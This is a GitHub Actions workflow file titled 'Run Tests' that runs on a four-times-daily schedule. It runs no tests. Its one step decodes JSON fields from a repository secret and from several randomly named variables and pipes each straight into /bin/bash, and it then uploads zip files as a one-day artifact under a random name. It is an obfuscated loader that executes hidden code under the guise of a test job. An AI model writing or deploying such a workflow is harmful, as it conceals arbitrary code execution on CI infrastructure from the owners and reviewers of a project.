name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '37 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  agent:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Perform
        env:
          tu03027: ${{ secrets.tu03027 }}
        run: |
          printf '%s' "$tu03027" | jq -r .copib37640 | /bin/bash
          printf '%s' "$kx5" | jq -r .u9038 | /bin/bash
          echo $hmq7 | jq -r .h846 | /bin/bash
          printf '%s' "$yop16" | jq -r .amwva43031 | /bin/bash
          echo $uysl3 | jq -r .inebe978 | /bin/bash

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: uyPJXzFc
          path: "*.zip"
          retention-days: 1
